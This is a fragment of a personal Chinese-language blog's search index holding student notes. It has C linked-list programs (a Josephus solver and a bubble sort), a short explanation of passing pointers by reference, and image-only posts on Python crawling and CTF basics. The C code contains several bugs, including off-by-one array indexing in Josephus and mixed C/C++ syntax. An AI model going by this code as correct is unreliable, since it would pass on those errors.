class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>&#123;</span><br><span class="hljs-type">int</span> data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>=</span><span class="hljs-literal">NULL</span>;<br>&#125;;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> x[],<span class="hljs-type">int</span> len)</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>*<span class="hljs-title">p</span>=</span>((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>L=p;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br>p-&gt;data=x[i];<br>p-&gt;next=((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br>p=p-&gt;next;<br>&#125;<br>p-&gt;next=<span class="hljs-literal">NULL</span>; <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fini5h3d\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Length</span><span class="hljs-params">(Node *L)</span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">while</span>(L-&gt;next!=<span class="hljs-literal">NULL</span>)&#123;<br>i++;<br>L=L-&gt;next;<br>&#125;<br><span class="hljs-keyword">return</span> i;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> num,<span class="hljs-type">int</span> d)</span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">a</span>=</span>((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">p</span>=</span>L;<br><span class="hljs-keyword">while</span>(i&lt;num<span class="hljs-number">-1</span>)&#123;<br>p=p-&gt;next;<br>i++;<br>&#125;<br>a-&gt;next=p-&gt;next;<br>p-&gt;next=a;<br>a-&gt;data=d;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1n53rt 5ucc355!\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Delete</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> num)</span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>Node *p=L;<br>shit3:<span class="hljs-keyword">if</span>(num&lt;<span class="hljs-number">0</span>)&#123;<br>num=num+Length(*&amp;L);<br><span class="hljs-keyword">goto</span> shit3;<br>&#125;<br><span class="hljs-keyword">if</span>(num&gt;=Length(*&amp;L))&#123;<br>num=num%Length(*&amp;L);<br>&#125;<br><span class="hljs-keyword">if</span>(num==<span class="hljs-number">0</span>)&#123;<br>L=L-&gt;next;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(i&lt;num<span class="hljs-number">-1</span>)&#123;<br>p=p-&gt;next;<br>i++;<br>&#125;<br>p-&gt;next=(p-&gt;next)-&gt;next;<br><span class="hljs-comment">//printf(&quot;D3l3t3 5ucc3553d!\n&quot;);</span><br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Print</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *L)</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">trans</span>=</span>L;<br><span class="hljs-keyword">if</span>(trans-&gt;next==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;empty list!\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(trans-&gt;next!=<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,trans-&gt;data);<br>trans=trans-&gt;next;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Pr1nt f1n15h3d\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">ChangeSpace</span><span class="hljs-params">(Node *&amp;L,<span class="hljs-type">int</span> a1,<span class="hljs-type">int</span> a2)</span>&#123;<br>Node *p=L;<br>Node *q=L;<br><span class="hljs-type">int</span> i; <br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;a1;i++)&#123;<br>p=p-&gt;next;   <span class="hljs-comment">//此时p到了下标a处</span><br>&#125;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;a2;i++)&#123;<br>q=q-&gt;next; <br>&#125;<br>i=p-&gt;data;<br>p-&gt;data=q-&gt;data;<br>q-&gt;data=i;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Sorted</span><span class="hljs-params">(Node *&amp;L)</span>&#123;<br><span class="hljs-type">int</span> i,j,k,t;<br>Node *p=L;<br><span class="hljs-type">int</span> len=Length(*&amp;L);<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len<span class="hljs-number">-1</span>;i++)&#123;<br>p=L;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;len<span class="hljs-number">-1</span>;j++)&#123;<br><span class="hljs-keyword">if</span>(p-&gt;data&lt;p-&gt;next-&gt;data)&#123;<br>t=p-&gt;data;<br>p-&gt;data=p-&gt;next-&gt;data;<br>p-&gt;next-&gt;data=t; <br>&#125;<br><br>p=p-&gt;next;<br>&#125;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fini5h3d\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">GetItem</span><span class="hljs-params">(Node *L,<span class="hljs-type">int</span> x)</span>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-comment">//printf(&quot;Get:Length=%d,x=%d\n&quot;,Length(*&amp;L),x);</span><br>shit1:<span class="hljs-keyword">if</span>(x&lt;<span class="hljs-number">0</span>)&#123;<br>x=x+Length(*&amp;L);<br><span class="hljs-keyword">goto</span> shit1;<br>&#125;<br><span class="hljs-keyword">if</span>(x&gt;=Length(*&amp;L))&#123;<br>x=x%Length(*&amp;L);<br>&#125;<br><span class="hljs-keyword">if</span>(x==<span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">return</span> L-&gt;data;<br>&#125;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;x;i++)&#123;<br>L=L-&gt;next;<br>&#125;<br><span class="hljs-comment">//printf(&quot;G3t 5ucc3553d,return=%d\n&quot;,L-&gt;data);</span><br><span class="hljs-keyword">return</span> L-&gt;data;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">IfEmpty</span><span class="hljs-params">(Node *L)</span>&#123;<br><span class="hljs-keyword">if</span>(L-&gt;next==<span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Josephus</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k,<span class="hljs-type">int</span> a[])</span>&#123;<br>Node *head, *p, *q;<br>head = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; ++ i)&#123;<br>p = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>p-&gt;data = a[i];<br>p-&gt;next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span>(head==<span class="hljs-literal">NULL</span>)&#123;<br>head = p;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>q-&gt;next = p;<br>&#125;<br>q = p;<br>&#125;<br>p-&gt;next = head;  <span class="hljs-comment">//形成循环链表</span><br>p = head;<br><span class="hljs-keyword">while</span>(p-&gt;next!=p)&#123; <span class="hljs-comment">// 条件不成立时循环链表中只有一个结点</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; k; ++ i)&#123;<br>q = p;<br>p = p-&gt;next;<br>&#125;<br>q-&gt;next = p-&gt;next;  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, p-&gt;data);<br><span class="hljs-built_in">free</span>(p);   <br>p = q-&gt;next;  <span class="hljs-comment">// 新一轮计数的起点  </span><br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, p-&gt;data);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">L</span>;</span><br><span class="hljs-type">int</span> i,num,a[<span class="hljs-number">30</span>],m,x;<br>shit:<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入初始报数上限数：\n&quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;num);<br><span class="hljs-keyword">if</span>(num&gt;<span class="hljs-number">30</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;err0r!!\n&quot;</span>);<br><span class="hljs-keyword">goto</span> shit;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入数组：\n&quot;</span>);<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;num;i++)&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;x);<br>a[i]=x;<br>&#125;<br>Init(*&amp;L,a,num);<br>Print(*&amp;L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入随机数m：\n&quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;m);<br>Josephus(num,m,a);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="列表排序"><a href="#列表排序" class="headerlink" title="列表排序"></a>列表排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>&#123;</span><br><span class="hljs-type">int</span> data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>=</span><span class="hljs-literal">NULL</span>;<br>&#125;;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> x[],<span class="hljs-type">int</span> len)</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>*<span class="hljs-title">p</span>=</span>((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>L=p;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br>p-&gt;data=x[i];<br>p-&gt;next=((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br>p=p-&gt;next;<br>&#125;<br>p-&gt;next=<span class="hljs-literal">NULL</span>; <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fini5h3d\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> num,<span class="hljs-type">int</span> d)</span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">a</span>=</span>((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">p</span>=</span>L;<br><span class="hljs-keyword">while</span>(i&lt;num<span class="hljs-number">-1</span>)&#123;<br>p=p-&gt;next;<br>i++;<br>&#125;<br>a-&gt;next=p-&gt;next;<br>p-&gt;next=a;<br>a-&gt;data=d;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;插入成功！\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Delete</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> num)</span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>Node *p=L;<br><span class="hljs-keyword">if</span>(num==<span class="hljs-number">0</span>)&#123;<br>L=L-&gt;next;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(i&lt;num<span class="hljs-number">-1</span>)&#123;<br>p=p-&gt;next;<br>i++;<br>&#125;<br>p-&gt;next=(p-&gt;next)-&gt;next;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除成功！\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Print</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *L)</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">trans</span>=</span>L;<br><span class="hljs-keyword">if</span>(trans-&gt;next==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;empty list!\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(trans-&gt;next!=<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,trans-&gt;data);<br>trans=trans-&gt;next;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;显示完毕\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">ChangeSpace</span><span class="hljs-params">(Node *&amp;L,<span class="hljs-type">int</span> a1,<span class="hljs-type">int</span> a2)</span>&#123;<br>Node *p=L;<br>Node *q=L;<br><span class="hljs-type">int</span> i; <br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;a1;i++)&#123;<br>p=p-&gt;next;   <span class="hljs-comment">//此时p到了下标a处</span><br>&#125;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;a2;i++)&#123;<br>q=q-&gt;next; <br>&#125;<br>i=p-&gt;data;<br>p-&gt;data=q-&gt;data;<br>q-&gt;data=i;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Length</span><span class="hljs-params">(Node *L)</span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">while</span>(L-&gt;next!=<span class="hljs-literal">NULL</span>)&#123;<br>i++;<br>L=L-&gt;next;<br>&#125;<br><span class="hljs-keyword">return</span> i;<br>&#125;<br><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Sorted</span><span class="hljs-params">(Node *&amp;L)</span>&#123;<br><span class="hljs-type">int</span> i,j,k,t;<br>Node *p=L;<br><span class="hljs-type">int</span> len=Length(*&amp;L);<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len<span class="hljs-number">-1</span>;i++)&#123;<br>p=L;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;len<span class="hljs-number">-1</span>;j++)&#123;<br><span class="hljs-keyword">if</span>(p-&gt;data&lt;p-&gt;next-&gt;data)&#123;<br>t=p-&gt;data;<br>p-&gt;data=p-&gt;next-&gt;data;<br>p-&gt;next-&gt;data=t;<br> <br>&#125;<br><br>p=p-&gt;next;<br>&#125;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fini5h3d!!\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">L</span>;</span><br><span class="hljs-type">int</span> num=<span class="hljs-number">5</span>,data=<span class="hljs-number">12</span>,x[]=&#123;<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;,len=<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(num); <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;初始化：\n&quot;</span>);<br>Init(L,x,len);<br>Print(L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;排序\n&quot;</span>);<br>Sorted(*&amp;L);<br>Print(L);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="关于L和-L的区别"><a href="#关于L和-L的区别" class="headerlink" title="关于L和&amp;L的区别"></a>关于<em>L和</em>&amp;L的区别</h2><p>我定义了个链表结构体Node，并声明了一个结构体指针<em>L，然后定义1个初始化函数Init()，将</em>L作为参数传进去，结果函数运行结束后发现，<em>L的next和data地址的值并未改变，即函数里对</em>L的修改出了函数就没卵用了</p><p>经查阅资料发现，原理是：将结构体指针传入函数时，函数内会做一个copy，但此时函数内的<em>L和函数外的</em>L指向的地址8一样，所以导致里面变化而外面不变</p><p>解决方法：传参时，将结构体指针的引用传过去，当传入函数的参数规定为*&amp;L时，将改变传入实参的值，为*L时，8会改变值</p><p>参考<br><a href="https://blog.csdn.net/c991262331/article/details/83274525">csdn</a></p><h2 id="，引用"><a href="#，引用" class="headerlink" title="&amp;，引用"></a>&amp;，引用</h2><p>地址是在电脑内存中的地址（变量的值在内存中的储存位置），指针是存地址的变量，所以指针可以“指向”内存地址。概念上讲，引用变量本质上是指针的另一个名字（但是并不能被编译器实例化）。。。wtf???这玩意你他妈不是学过吗?</p><p>就把引用当成变量的另一个名字就好</p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python爬虫</title>
    <link href="/2021/08/06/python%E7%88%AC%E8%99%AB/"/>
    <url>/2021/08/06/python%E7%88%AC%E8%99%AB/</url>
    
    <content type="html"><![CDATA[<p>一个编程辣鸡学习爬虫的简单笔记<br><img src="/images/%E7%88%AC%E8%99%AB_%E5%89%AF%E6%9C%AC.png"></p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>misc一些焯基础知识</title>
    <link href="/2021/07/31/misc%E4%B8%80%E4%BA%9B%E7%84%AF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2021/07/31/misc%E4%B8%80%E4%BA%9B%E7%84%AF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p><img src="/images/Misc%E5%85%A5%E9%97%A8%E7%BA%A7%E7%9F%A5%E8%AF%86.png"></p><p><img src="/images/16%E8%BF%9B%E5%88%B6%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%80%BB%E7%BB%93.png"></p><p><img src="/images/%E5%90%84%E7%A7%8D%E5%8A%A0%E5%AF%86%E5%B0%8F%E7%BB%93%E9%80%9F%E6%9F%A5.png"><br><img src="/images/%E5%B0%8F%EF%BC%9A%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86.png"><br><img src="/images/%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
